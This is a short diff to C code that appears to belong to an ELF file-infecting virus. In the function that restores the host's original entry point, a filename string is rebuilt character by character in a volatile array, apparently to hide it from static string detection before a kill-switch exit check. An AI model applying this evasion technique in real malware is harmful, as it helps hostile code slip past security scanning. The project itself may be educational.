@@ -85,7 +85,14 @@ jump_back(int fd_self) {
 
     uint64_t old_entry = old_entry_get(&file_self);
 
-    int fd_is_incubator = ft_open("./incubator_4242", O_RDONLY, 0);
+    volatile char incubation[5];
+    incubation[0] = '4';
+    incubation[1] = '2';
+    incubation[2] = '4';
+    incubation[3] = '2';
+    incubation[4] = '\0';
+
+    int fd_is_incubator = ft_open(incubation, O_RDONLY, 0);
     if (fd_is_incubator > 0) {
         ft_close(fd_is_incubator);
         ft_exit(0);
